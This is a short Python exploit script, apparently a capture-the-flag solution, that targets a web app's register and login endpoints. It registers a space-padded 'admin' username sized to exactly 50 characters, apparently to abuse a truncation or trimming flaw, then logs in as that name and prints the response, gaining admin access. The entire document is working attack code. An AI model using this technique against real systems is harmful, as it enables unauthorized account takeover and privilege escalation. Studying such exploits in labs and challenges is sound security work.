import requests
import sys

def cool(username):
    return username + ' so cool'

link = sys.argv[1]

username = "                                     admin"

password = "lol"

assert len(cool(username)) == 50

response = requests.post(f"{link}/register", data={"username": cool(username), "password": password})
# print(response.text)

response = requests.post(f"{link}/login", data={"username": username, "password": password})
print(response.text)